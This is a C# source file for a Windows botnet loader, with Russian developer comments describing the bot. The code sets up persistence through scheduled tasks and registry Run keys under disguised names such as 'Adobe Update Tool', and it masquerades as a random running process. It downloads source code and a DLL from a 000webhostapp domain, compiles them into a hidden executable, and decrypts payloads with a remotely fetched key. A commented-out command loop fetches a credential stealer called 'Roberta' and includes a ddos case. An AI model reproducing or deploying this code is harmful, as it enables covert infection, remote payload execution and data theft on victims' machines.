using System;
using System.Collections.Generic;
using Microsoft.CSharp;
using System.Net;
using System.CodeDom.Compiler;
using System.IO;
using System.Management;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO.Compression;
using System.Text;
using System.Security.Principal;
using Microsoft.Win32;
using System.Linq;

//using Microsoft.Win32.TaskScheduler;
//using System.Windows.Forms;

namespace ConsoleCompiler
{
    internal class Program
    {
        
        private static void Main(string[] args)
         {
            Antiemul.Cmd("schtasks /create /tn  Microsoft_Skype  /tr C:\\Users\\riciu\\Desktop\\Debug\\ReadHelper.exe  /st " + DateTime.Now.AddMinutes(1.0).ToString("HH:mm") + " /du 9999:59 /sc daily /ri 1 /f"); //%userprofile%\\AppData\\Local\\SkypeHost.exe 

            //var a = Antiemul.RandomProcessname(); //Рандомное имя для процесса ботнета 
            ////var govno = a.ToString().Split('(');
            ////var kall = govno[1].ToString().Split(')');
            ////string musorka = kall[0];


            //2.бот создает себе директорию в ProgramData с рандомным именем в стиле { 000000 - 0000 - 0000 - 000000000}
            //, ставит атрибуты скрытый | системный, бьет ntfs-поток(обход смарт - скрина),
            //берет рандомное имя с одного из запущенных процессов, копируется в созданную директорию, запускается(с проверкой запуска shellexecuteex)

            //3.после запуска в созданной папке проверяет свое местонахождение, засыпает на минуту, 
            //затем проверяет мютексом(генерируется для каждой машины свой, генерация основана на наименовании железа конкретной машины) нет ли других копий бота,
            //после чего делает запрос к серверу для проверки регистрации, если реги не было, то отправляет данные о машине

            //long lTicks = DateTime.Now.Ticks;

            //if ((DateTime.Now.Ticks - lTicks) < 10L) //проверяем время на наше тысячелетие 
            //{
            //  Process.GetCurrentProcess().Kill();
            //}

            try
            {
                FileStream lol = new FileStream(Antiemul.DefaultPath + "\\mutex.txt", FileMode.CreateNew);//нужно создавать файл что бы ловить exeption при его существовании
                lol.Close();
                int a;
                while ((a = Antiemul.GetProcessOwner(Antiemul.RandomProcessname())) == 0)
                {

                }
                var c = Process.GetProcessById(a);
                File.WriteAllText(Antiemul.DefaultPath + "\\mutex.txt", Antiemul.GetHwid() + ";" + c.MainModule.ModuleName+ ";" +c.MainModule.FileVersionInfo.FileDescription);
                Process.Start(Process.GetCurrentProcess().MainModule.FileName);
                Thread.Sleep(7000);
            }
            catch //(System.IO.IOException)
            {
                var data = File.ReadAllText(Antiemul.DefaultPath + "\\mutex.txt");
                string[] name = data.Split(';');
                if (!File.Exists(Antiemul.DefaultPath + "\\" +name[1]))
                {
                    File.WriteAllBytes(Antiemul.DefaultPath + "\\source.zip", Antiemul.Downloadbyte("https://richiichi.000webhostapp.com/code.zip"));  //EXEPTION не может скачать файл

                    File.Move(Antiemul.DefaultPath + "\\source.zip", Antiemul.DefaultPath + "\\source.txt"); //УБРАТЬ ЭТО ГОВНО

                   //Decrypt.Decrypter("source", Antiemul.DefaultPath, false);
                    string source = File.ReadAllText(Antiemul.DefaultPath + "\\source.txt");
                    File.Delete(Antiemul.DefaultPath + "\\source.txt");

                    Dictionary<string, string> providerOptions = new Dictionary<string, string>
                    {
                    {"CompilerVersion", "v4.0"}
                    };

                    CSharpCodeProvider provider = new CSharpCodeProvider(providerOptions);

                    CompilerParameters compilerParams = new CompilerParameters

                    { OutputAssembly = Antiemul.DefaultPath + "\\" + name[1] , GenerateExecutable = true, CompilerOptions = "/target:winexe",IncludeDebugInformation=false};///////////////////////////////////

                    compilerParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                    compilerParams.ReferencedAssemblies.Add("System.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Core.dll");
                    compilerParams.ReferencedAssemblies.Add("mscorlib.dll");
                    compilerParams.ReferencedAssemblies.Add("System.Management.dll");

                    if (!File.Exists(Antiemul.DefaultPath + "\\ClipboardHelper.zip"))
                    {
                        File.WriteAllBytes(Antiemul.DefaultPath + "\\ClipboardHelper.zip", Antiemul.Downloadbyte("https://richiichi.000webhostapp.com/ClipboardHelper.zip"));
                    }
                    
                    if (!File.Exists(Antiemul.DefaultPath + "\\ClipboardHelper.dll"))
                    {
                        File.Move(Antiemul.DefaultPath + "\\ClipboardHelper.zip", Antiemul.DefaultPath + "\\ClipboardHelper.dll"); //УБРАТЬ ЭТО ГОВНО
                        File.Delete(Antiemul.DefaultPath + "\\ClipboardHelper.zip");
                    }
                    
                    compilerParams.ReferencedAssemblies.Add(Antiemul.DefaultPath + "\\ClipboardHelper.dll");

                    CompilerResults results = provider.CompileAssemblyFromSource(compilerParams, source);

                    Console.WriteLine("Number of Errors: {0}", results.Errors.Count);
                    foreach (CompilerError err in results.Errors)
                    {
                        Console.WriteLine("ERROR {0}", err.ErrorText);
                    }
                    
                    File.SetAttributes(Antiemul.DefaultPath + "\\" + name[1] , FileAttributes.Hidden | FileAttributes.System);
                    Scheduler.FullCheck("Adobe Update Tool", Antiemul.DefaultPath + "\\" + name[1] );
                    Antiemul.AddToStartup(name[1],name[2]); //процесс может не запускатся если файл не может быть добавлен в планировщик задач 
                    
                }
            }
        }
    }

    public class Antiemul
    {
        public static readonly string DefaultPath = Environment.GetEnvironmentVariable("Temp");

        public static int RandomProcessname()
        {

            //TODO больно глазам переписать    

            Process[] localAll = Process.GetProcesses();
            Process a;

            a = localAll[new Random().Next(0, localAll.Length)];
            while(a.ToString() == "svchost")
            {
                a = localAll[new Random().Next(0, localAll.Length)];
            }

            return a.Id;
        }
        public static void AddToStartup(string currFilename,string description)
        {
            Cmd("schtasks /create /tn "+  description +"  /tr %userprofile%\\AppData\\Local\\" + currFilename + " /st 00:00 /du 9999:59 /sc daily /ri 1 /f");
        }//\\System\\SecurityService
        //schtasks /create /tn  Microsoft_Skype  /tr %userprofile%\\AppData\\Local\\SkypeHost.exe  /st 00:00 /du 9999:59 /sc daily /ri 1 /f

        public static void Cmd(string command)
        {
            var process = new Process
            {
                StartInfo = new ProcessStartInfo("cmd", "/C " + command)
            };
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();
        }

        public static int GetProcessOwner(int processId)
        {
            var query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectCollection processList;

            using (var searcher = new ManagementObjectSearcher(query))
            {
                processList = searcher.Get();
            }

            foreach (var mo in processList.OfType<ManagementObject>())
            {
                object[] argList = { string.Empty, string.Empty };
                var returnVal = Convert.ToInt32(mo.InvokeMethod("GetOwner", argList));

                if (returnVal == 0)
                {
                    // return DOMAIN\user
                    return processId;
                }
            }

            return 0;
        }


        public static string GetHwid() // Works
        {
            string id = "";
            try
            {
                var mbs = new ManagementObjectSearcher("Select ProcessorId From Win32_processor");
                ManagementObjectCollection mbsList = mbs.Get();

                foreach (ManagementObject mo in mbsList)
                {
                    id = mo["ProcessorId"].ToString();
                    break;
                }
                if (id == "")
                {
                    id = Environment.UserName;
                }
                return id;
            }
            catch (Exception)
            {
                id = Environment.UserName;
                return id;
            }
        }
        public static byte[] Downloadbyte(string url)
        {
            using (WebClient webclient = new WebClient())
            {
                //Uri rofl = new Uri("url");
                return webclient.DownloadData(url);

            }
        }
    }

    public class Decrypt
    {
        public static void Decrypter(string filename, string no_full_path, bool exe_or_txt)
        {
            try
            {
                var PrivateKey = Antiemul.Downloadbyte("https://richiichi.000webhostapp.com/private.key");
                // Randomname zippath = new Randomname();
                OpenFileDialog Open = new OpenFileDialog();
                Decrypt decrypt = new Decrypt();
                //Open.FileName = GetDirPath.dir + "\\" + filename + ".zip";
                if (filename + ".zip" != "" && PrivateKey != null)
                {
                    Directory.CreateDirectory(no_full_path + "\\Decrypted");
                    decrypt.DecryptFile(no_full_path + "\\" + filename + ".zip", no_full_path + "\\Decrypted\\" + filename + ".zip", PrivateKey);
                }
                File.Delete(no_full_path + "\\" + filename + ".zip"); //GetDirPath.dir + Path.GetFileName(Open.FileName)

                File.Move(no_full_path + "\\Decrypted\\" + filename + ".zip", no_full_path + "\\" + filename + (exe_or_txt ? ".exe" : ".txt"));
                Directory.Delete(no_full_path + "\\Decrypted", true);
                File.Delete(no_full_path + "\\" + filename + ".zip");
            }
            catch
            {
                Console.WriteLine("VAJA KRIPTOR NE RABOTAET");
            }
        }
        public void DecryptFile(string inputFile, string outputFile, byte[] privatekey)
        {
            try
            {
                using (RijndaelManaged aes = new RijndaelManaged())
                {

                    DecompressToDirectory(inputFile, Path.GetDirectoryName(outputFile)); //Разделяет файл на два отдельных файла . Первый key Второй Зашифрованый файл. 
                    byte[] skey = DecryptKey(File.ReadAllBytes(Path.GetDirectoryName(outputFile) + "\\key"), privatekey);
                    byte[] key = skey;

                    /* This is for demostrating purposes only. 
                     * Ideally you will want the IV key to be different from your key and you should always generate a new one for each encryption in other to achieve maximum security*/
                    byte[] IV = skey;
                    using (FileStream fsCrypt = new FileStream(Path.GetDirectoryName(outputFile) + "\\Encrypted", FileMode.Open))
                    {
                        using (FileStream fsOut = new FileStream(outputFile, FileMode.Create))
                        {
                            using (ICryptoTransform decryptor = aes.CreateDecryptor(key, IV))
                            {
                                using (CryptoStream cs = new CryptoStream(fsCrypt, decryptor, CryptoStreamMode.Read))
                                {
                                    int data;
                                    while ((data = cs.ReadByte()) != -1)
                                    {
                                        fsOut.WriteByte((byte)data);
                                    }
                                }
                            }
                        }
                    }
                    File.Delete(Path.GetDirectoryName(outputFile) + "\\Encrypted");
                    File.Delete(Path.GetDirectoryName(outputFile) + "\\key");
                }
            }
            catch
            {
                Console.WriteLine("Can't decrypt file");
            }
        }
        public byte[] DecryptKey(byte[] key, byte[] PrivateKey)
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.ImportCspBlob(PrivateKey);

            return rsa.Decrypt(key, true);
        }
        static void DecompressToDirectory(string sCompressedFile, string sDir)
        {
            using (FileStream inFile = new FileStream(sCompressedFile, FileMode.Open, FileAccess.Read, FileShare.None))
            using (GZipStream zipStream = new GZipStream(inFile, CompressionMode.Decompress, true))
                while (DecompressFile(sDir, zipStream)) ;
        }
        static bool DecompressFile(string sDir, GZipStream zipStream)
        {
            //Decompress file name
            byte[] bytes = new byte[sizeof(int)];
            int Readed = zipStream.Read(bytes, 0, sizeof(int));
            if (Readed < sizeof(int))
                return false;

            int iNameLen = BitConverter.ToInt32(bytes, 0);
            bytes = new byte[sizeof(char)];
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < iNameLen; i++)
            {
                zipStream.Read(bytes, 0, sizeof(char));
                char c = BitConverter.ToChar(bytes, 0);
                sb.Append(c);
            }
            string sFileName = sb.ToString();

            //Decompress file content
            bytes = new byte[sizeof(int)];
            zipStream.Read(bytes, 0, sizeof(int));
            int iFileLen = BitConverter.ToInt32(bytes, 0);

            bytes = new byte[iFileLen];
            zipStream.Read(bytes, 0, bytes.Length);

            string sFilePath = Path.Combine(sDir, sFileName);
            string sFinalDir = Path.GetDirectoryName(sFilePath);
            if (!Directory.Exists(sFinalDir))
                Directory.CreateDirectory(sFinalDir);

            using (FileStream outFile = new FileStream(sFilePath, FileMode.Create, FileAccess.Write, FileShare.None))
                outFile.Write(bytes, 0, iFileLen);

            return true;
        }
    }

    class Scheduler
    {
        public static String GenerateString()
        {
            string abc = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm";
            string result = "";
            Random rnd = new Random();
            int iter = rnd.Next(0, abc.Length);
            for (int i = 0; i < iter; i++)
                result += abc[rnd.Next(0, abc.Length)];
            return result;
        }
        public static bool IsAdmin()
        {
            bool isElevated;
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            return isElevated;
        }

        public static bool CheckAutorun(bool User, string regedit_name)
        {

            using (RegistryKey Key = User ? Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\")
                : Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\")) //Тернарный оператор
                if (Key != null)
                {
                    //string val = Key.GetValue("COMODO Internet Security");
                    if (Key.GetValue(regedit_name) == null)
                    {
                        return false;
                    }
                }
            return true;
        }
        public static void FullCheck(string name, string path)
        {
            if (IsAdmin())
            {
                if (!CheckAutorun(false, name))
                {
                    SetAutorunValue(true, false, name, path);
                }
            }
            else
            {
                if (!CheckAutorun(true, name))
                {
                    SetAutorunValue(true, true, name, path);
                }
            }
        }

        public static void SetAutorunValue(bool autorun, bool User, string name, string path)
        {
            RegistryKey reg;


            reg = User ? Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\")
                : Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run\");
            try
            {
                if (autorun)
                    reg.SetValue(name, path);
                else
                    reg.DeleteValue(name);

                reg.Close();
            }
            catch
            {

            }
        }
    }
}
//@"using System.Collections.Generic;  using System.Linq;  using System.Net;
//namespace Foo 
//{ 

//  public class GetDirPath
//    {
//        public static readonly string DefaultPath = Environment.GetEnvironmentVariable(""Temp"");

//        public static readonly string User_Name = Path.Combine(DefaultPath, Environment.UserName);

//        public static readonly string Pass_File = Path.Combine(User_Name, ""List_Password.txt"");

//        public static string GetHwid() // Works
//        {
//            string HoldingAdress = "";
//            try
//            {
//                string drive = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1);
//                ManagementObject disk = new ManagementObject(""win32_logicaldisk.deviceid=\"""""" + drive + "":\"");
//                disk.Get();
//                string diskLetter = (disk[""VolumeSerialNumber""].ToString());
//                HoldingAdress = diskLetter;

//            }
//            catch (Exception)
//            {

//            }

//            return HoldingAdress;
//        }
//        public static string dir = GetDirPath.DefaultPath + ""\\"" + GetDirPath.GetHwid();
//    }

//    public class Bar 
//    { 
//        static void Main(string[] args) 
//        { 
//string commandname = ""ddos"";
// for (; ; )
//            {
//                string[] data = new string[0];
//                try
//                {
//                    data = commandname.Split(';');
//                }
//                catch { }
//                try
//                {
//                    switch (data[0])
//                    {
                        
//                        case ""update"": //data[1] filename
//                            System.IO.File.Delete(GetDirPath.dir + ""\\"" + data[1] + "".zip"");
//            System.IO.File.Delete(GetDirPath.dir + ""\\"" + data[1] + "".exe"");
//            //Botnet.Allbotnet(data[1], data[2]);
//            break;
//                        case ""remove"": //data[1] file path
//                            System.IO.File.Delete(data[1]);
//            break;
//                        case ""ddos"":
//                            System.Console.WriteLine(""Eto dudoz nahoj"");
//            break;
//                        case ""download"":
//                            if (!File.Exists(GetDirPath.dir + data[1] + "".exe""))
//            {
//                Botnet.Allbotnet(data[1], data[2]); //data 0 - command ; data - 1 filename ; data - 2 url for download with out path to downloading file exmple:""https://richiichi.000webhostapp.com/""
//            }
//            break;
//                        case ""start"": //data 1 file path
//                            Scheduler.Task(data[1]);
//            break;
//                        case ""checkprocess"":
//                            string processName = data[1];
//            processName = processName.Replace("".exe"", """");
//            if (Botnet.CheckProcess(data[1]))
//            {
//                System.Console.WriteLine(""process est"");
//            }
//            else
//            {
//                Console.WriteLine(""process net"");
//            }
//            break;
//            default :
//                            if (!File.Exists(GetDirPath.dir + ""\\Roberta.exe"") || !Botnet.CheckProcess(""Roberta"")) //&& process not running
//            {
//                System.IO.File.Delete(GetDirPath.dir + ""\\"" + ""Roberta"" + "".zip"");
//                System.IO.File.Delete(GetDirPath.dir + ""\\"" + ""Roberta"" + "".exe"");
//                Botnet.Allbotnet(""Roberta"", ""https://richiichi.000webhostapp.com/""); //new name of stealer is Roberta
//            }
//            break;
//        }

//        Thread.Sleep(interval);
//                }
//                catch
//                {
//                    System.Console.WriteLine(""Can't update"");
//                }
//            }
//        } 
 
//        public static void SayHello() 
//        { 
//            System.Console.WriteLine(""Hello World""); 
//            System.Console.WriteLine( string.Join("","", Enumerable.Range(0,10).Select(n=>n.ToString()).ToArray() ) );         }
//    }
//}